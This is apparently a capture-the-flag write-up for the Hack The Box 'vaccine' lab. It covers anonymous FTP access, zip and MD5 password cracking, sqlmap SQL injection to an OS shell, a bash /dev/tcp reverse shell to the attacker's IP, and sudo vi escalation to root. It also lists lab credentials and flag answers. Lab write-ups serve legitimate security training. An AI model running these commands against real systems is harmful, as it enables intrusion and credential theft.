# Tasks
- Besides SSH and HTTP, what other service is hosted on this box?
	- FTP
- This service can be configured to allow login with any password for specific username. What is that username?
	- Anonymous
- What is the name of the file downloaded over this service?
	- backup.zip
- What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
	- zip2john
- What is the password for the admin user on the website?
	- qwerty789
- What option can be passed to sqlmap to try to get command execution via the sql injection?
	- --os-shell
- What program can the postgres user run as root using sudo?
	- vi
- User flag
	- ec9b13ca4d6229cd5cc1e09980965bf7
- Root flag
	- dd6e058e814260bc70e9bbdef2715849


# Notes
- First, let's start off with rustscan
```
rustscan --ulimit 5000 --addresses "10.129.17.197" --top -- -sC -sV
```
- From the results, we see that along with SSH and HTTP, there is also an FTP server running on this box
```
PORT   STATE SERVICE REASON         VERSION  
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip  
| ftp-syst:    
|   STAT:    
| FTP server status:  
|      Connected to ::ffff:10.10.15.113  
|      Logged in as ftpuser  
|      TYPE: ASCII  
|      No session bandwidth limit  
|      Session timeout in seconds is 300  
|      Control connection is plain text  
|      Data connections will be plain text  
|      At session startup, client count was 2  
|      vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 c0ee58077534b00b9165b259569527a4 (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzC28uKxt9pqJ4fLYmq/X5t7p44L+bUFQIDeEab29kDPnKdFOa9ijB5C5APVxLaAXVYSXATPYUqjIEWU98Vvvol1zuc82+KG9KfX94pD8TaPY2MZnoi9TfSxgwmKpmiRWR4DwwMS+mNo+WBU3sjB2QjgNip2vbiHxMitKeIfDLLFYiLKhc1eBRtooZ6DJzXQOMFp  
5QhSbZygWqebpFcsrmFnz9QWhx4MekbUnUVPKwCunycLi1pjrsmOAekbGz3/5R3H5tFSck915iqyc8bSkBZgRwW3FDJAXFmFgHG9fX727HsXFk8MXmVRMuH1LxGjvn1q3j27bb22QzprS7t9bJciWfwgt1sl57S0Q+iFbku83NgAFxUG373nspOHn08DwMllCyeLOG3Oy3x9zcCxMGATopiPckt8lb1GCWIvLPSNHMW1  
2OyCKGM+AmLu4q9z7zX1YOUM6oxfn3qZVLKSZJ/DJu+aifv2BVNu/zJU2wdk1vFxysmQ4roj5O5I+H9x0=  
|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNsSORVFGkIbgItDm/mxmyPhpsIJihXV8y4CQiMTWGdEVQatXNIlXX0yGLZ4JFtPEX9rOGAp/eLZc0mGJtDyuyQ=  
|   256 425bc321dfefa20bc95e03421d69d028 (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXvk132UscLPAfaZyZ2Av54rpw9cP31OrloBE9v3SLW  
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
| http-cookie-flags:    
|   /:    
|     PHPSESSID:    
|_      httponly flag not set  
|_http-title: MegaCorp Login  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
- We are also told that we can use anonymous login on this specific FTP instance
- So, we can go ahead and connect anonymously to it:
```
[Jan 01, 2026 - 15:58:24 (PST)] exegol-htb-starting-point /workspace # ftp 10.129.17.197        
Connected to 10.129.17.197.  
220 (vsFTPd 3.0.3)  
Name (10.129.17.197:root): anonymous  
331 Please specify the password.  
Password:    
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp>
```
- There appears to be only one file, which is a zip file named backup, so we'll go ahead and download it onto our machine
```
229 Entering Extended Passive Mode (|||10678|)  
150 Here comes the directory listing.  
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip  
226 Directory send OK.  
ftp> get backup.zip  
local: backup.zip remote: backup.zip  
229 Entering Extended Passive Mode (|||10119|)  
150 Opening BINARY mode data connection for backup.zip (2533 bytes).  
100% |***********************************************************************************************************************************************************************************************|  2533      415.59 KiB/s    00:00 ETA  
226 Transfer complete.  
2533 bytes received in 00:00 (26.42 KiB/s)  
ftp>
```
- Tried to unzip it, but it appears to be password protected:
```
[Jan 01, 2026 - 16:03:01 (PST)] exegol-htb-starting-point /workspace # unzip backup.zip                 
Archive:  backup.zip  
[backup.zip] index.php password:    
  skipping: index.php               incorrect password  
  skipping: style.css               incorrect password
```
- Well, looks like we need to brute force the password using something like John The Ripper
- Specifically, we'll use John The Ripper's zip2john script
-  We can go ahead and grab the hashes for this file:
```
[Jan 01, 2026 - 16:11:40 (PST)] exegol-htb-starting-point /workspace # zip2john backup.zip > hashes  
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8  
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8  
NOTE: It is assumed that all files in each archive have the same password.  
If that is not the case, the hash may be uncrackable. To avoid this, use  
option -o to pick a file at a time.  
[Jan 01, 2026 - 16:11:49 (PST)] exegol-htb-starting-point /workspace # cat hashes      
backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a  
11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f340  
1142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7  
672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc9  
8f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52  
d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c  
817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa5570  
56ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f  
1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/p  
kzip$::backup.zip:style.css, index.php:backup.zip  
[Jan 01, 2026 - 16:11:57 (PST)] exegol-htb-starting-point /workspace #
```
- Now, we can use john to crack the hashes
```
[Jan 01, 2026 - 16:11:57 (PST)] exegol-htb-starting-point /workspace # john --wordlist=`fzf-wordlists` hashes                
Using default input encoding: UTF-8  
Loaded 1 password hash (PKZIP [32/64])  
Will run 32 OpenMP threads  
Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected  
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status  
741852963        (backup.zip)        
1g 0:00:00:00 DONE (2026-01-01 16:14) 33.33g/s 2184Kp/s 2184Kc/s 2184KC/s 123456..ryanscott  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```
- We are able to get the password we need and unzip the file
- From there, we are given a index.php and style.css files
- Looking at index.php, we are able to actually pull out admin credentials:
```
<!DOCTYPE html>  
<?php  
session_start();  
 if(isset($_POST['username']) && isset($_POST['password'])) {  
   if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {  
     $_SESSION['login'] = "true";  
     header("Location: dashboard.php");  
   }  
 }  
?>  
<html lang="en" >  
<head>  
 <meta charset="UTF-8">  
 <title>MegaCorp Login</title>  
 <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">  
  
</head>  
 <h1 align=center>MegaCorp Login</h1>  
<body>  
<!-- partial:index.partial.html -->  
<body class="align">  
  
 <div class="grid">  
  
   <form action="" method="POST" class="form login">  
  
     <div class="form__field">  
       <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>  
       <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>  
     </div>  
  
     <div class="form__field">  
       <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>  
       <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>  
     </div>  
  
     <div class="form__field">  
       <input type="submit" value="Sign In">  
     </div>  
  
   </form>  
  
  
 </div>  
  
 <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0  
-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 4  
0-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121  
0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-11  
2.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>  
  
</body>  
<!-- partial -->  
    
</body>  
</html>
```
- Of course, the password (2cb42f8734ea607eefed3b70af13bbd3) is hashed
- It is hashed using MD5, so we can use hashcat to go ahead and crack it
```
[Jan 01, 2026 - 16:19:14 (PST)] exegol-htb-starting-point /workspace # hashcat -a 0 -m 0 admin_hash `fzf-wordlists`    
hashcat (v6.2.6) starting  
  
OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
==================================================================================================================================================  
* Device #1: pthread-skylake-avx512-AMD Ryzen 9 7950X 16-Core Processor, 62881/125827 MB (16384 MB allocatable), 32MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Early-Skip  
* Not-Salted  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
* Raw-Hash  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory required for this attack: 8 MB  
  
Dictionary cache built:  
* Filename..: /opt/lists/rockyou.txt  
* Passwords.: 14344391  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
* Runtime...: 1 sec  
  
2cb42f8734ea607eefed3b70af13bbd3:qwerty789                   
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 0 (MD5)  
Hash.Target......: 2cb42f8734ea607eefed3b70af13bbd3  
Time.Started.....: Thu Jan  1 16:19:40 2026 (0 secs)  
Time.Estimated...: Thu Jan  1 16:19:40 2026 (0 secs)  
Kernel.Feature...: Pure Kernel  
Guess.Base.......: File (/opt/lists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........:  3795.9 kH/s (0.25ms) @ Accel:1024 Loops:1 Thr:1 Vec:16  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 131072/14344384 (0.91%)  
Rejected.........: 0/131072 (0.00%)  
Restore.Point....: 98304/14344384 (0.69%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#1....: Detroit -> koryna  
Hardware.Mon.#1..: Temp: 64c Util:  4%  
  
Started: Thu Jan  1 16:19:27 2026  
Stopped: Thu Jan  1 16:19:41 2026
```
- We are then able to get the password, which is qwerty789
- Now that we have the full credentials, we are able to log into the admin portal
- We are lead to a lookup, which could mean possible SQL database, and therefore, a possible SQL injection
- sqlmap can be used to test for this
- Specifically, we can use the --os-shell option.
- We will also need the PHPSESSID, which we can find in the Cookies tab in the Developer Tools
	- PHPSESSID: 32lq5bmjeeb6oic143u074rjud
- Now, we have everything we need to run a sqlmap session:
```
sqlmap -u 'http://10.129.17.197/dashboard.php?search=any+query' --cookie="PHPSESSID=32lq5bmjeeb6oic143u074rjud"
```
- From the results, we are able to confirm that the site is vulnerable to SQL injection
```
       ___  
      __H__  
___ ___[)]_____ ___ ___  {1.9.7.7#dev}  
|_ -| . [,]     | .'| . |  
|___|_  [']_|_|_|__,|  _|  
     |_|V...       |_|   https://sqlmap.org  
  
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not re  
sponsible for any misuse or damage caused by this program  
  
[*] starting @ 17:16:49 /2026-01-01/  
  
[17:16:49] [INFO] resuming back-end DBMS 'postgresql'    
[17:16:49] [INFO] testing connection to the target URL  
sqlmap resumed the following injection point(s) from stored session:  
---  
Parameter: search (GET)  
   Type: boolean-based blind  
   Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)  
   Payload: search=any query' AND (SELECT (CASE WHEN (1568=1568) THEN NULL ELSE CAST((CHR(108)||CHR(113)||CHR(106)||CHR(99)) AS NUMERIC) END)) IS NULL-- XVUe  
  
   Type: error-based  
   Title: PostgreSQL AND error-based - WHERE or HAVING clause  
   Payload: search=any query' AND 9920=CAST((CHR(113)||CHR(120)||CHR(98)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (9920=9920) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(113)||CHR(107)||CHR(113)) AS NUMERIC)-- lXoO  
  
   Type: stacked queries  
   Title: PostgreSQL > 8.1 stacked queries (comment)  
   Payload: search=any query';SELECT PG_SLEEP(5)--  
  
   Type: time-based blind  
   Title: PostgreSQL > 8.1 AND time-based blind  
   Payload: search=any query' AND 4813=(SELECT 4813 FROM PG_SLEEP(5))-- xxWy  
---  
[17:16:49] [INFO] the back-end DBMS is PostgreSQL  
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)  
web application technology: Apache 2.4.41  
back-end DBMS: PostgreSQL  
[17:16:49] [INFO] fingerprinting the back-end DBMS operating system  
[17:16:49] [INFO] the back-end DBMS operating system is Linux  
[17:16:50] [INFO] testing if current user is DBA  
[17:16:50] [INFO] retrieved: '1'  
[17:16:50] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution  
[17:16:50] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
```
- We have a shell, but it's very basic.
- Just like with reverse shells, we can upgrade it by using a payload like this:
```
bash -c "bash -i >& /dev/tcp/10.10.15.113/443 0>&1"
```
- We'll just make sure we have a listener going on:
```
nc -lvnp 443
```
- Now with a better connection established, we can upgrade it to be interactive:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- We can then go into the /var/lib/postgresql folder and get the user flag:
```
postgres@vaccine:/var/lib/postgresql$ cat user.txt  
cat user.txt  
ec9b13ca4d6229cd5cc1e09980965bf7
```
- Now, we need to get the root flag
- So, we need to priv-esc. First, let's run sudo -l to see what we are able to run
- But first, we need the password, which we can find in /var/www/html
- Within the dashboard.php file, we are able to pull out the credentials we need:
	- postgres: P@s5w0rd!
- Now, we can run sudo -l
```
postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l  
sudo -l  
[sudo] password for postgres: P@s5w0rd!  
  
Matching Defaults entries for postgres on vaccine:  
   env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR  
   XFILESEARCHPATH XUSERFILESEARCHPATH",  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,  
   mail_badpass  
  
User postgres may run the following commands on vaccine:  
   (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
- We can see that we can run the vi editor, which is something we can work with
- Using a resource like GTFOBins, we can use something like:
```
sudo vi -c ':!/bin/sh' /dev/null
```
- We need to modify it a bit since we are only able to use sudo on a specific file, which is /etc/postgresql/11/main/pg_hba.conf
- So, we can use this:
```
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
- We can then run the set command to set our shell
```
:set shell=/bin/bash
```
- And then run it!
```
:shell
```
- From there, we are able to get root!
```
root@vaccine:/var/lib/postgresql/11/main# whoami  
whoami  
root
```
- We then are able to navigate to the root folder and get our root flag!
```
root@vaccine:/var/lib/postgresql/11/main# cd /root/    
cd /root/  
root@vaccine:~# ls  
ls  
pg_hba.conf  root.txt  snap  
root@vaccine:~# cat root.txt  
cat root.txt  
dd6e058e814260bc70e9bbdef2715849
```
